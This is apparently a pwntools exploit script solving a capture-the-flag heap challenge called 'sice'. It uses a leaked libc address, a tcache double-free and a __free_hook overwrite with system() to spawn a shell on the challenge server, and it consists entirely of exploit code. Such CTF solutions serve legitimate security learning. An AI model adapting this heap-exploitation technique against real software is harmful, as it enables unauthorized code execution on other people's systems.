from pwn import *

e = ELF("./sice")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("house-of-sice.hsc.tf", 1337)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

def alloc(val=0x1337, typ=1):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(typ))
  p.sendlineafter(">", str(val))

def free(idx):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(idx))

p.recvuntil("0x")
leak = int(p.recvline(), 16) - libc.symbols["system"]

print(hex(leak))

debug()

for i in range(8):
  alloc()

for i in range(7):
  free(i)

free(7)

alloc()
alloc()

free(7)

alloc(val=leak + libc.symbols["__free_hook"], typ=2)

alloc()
alloc(u64("/bin/sh\x00"))
alloc(leak + libc.symbols["system"])

free(12)



p.interactive()
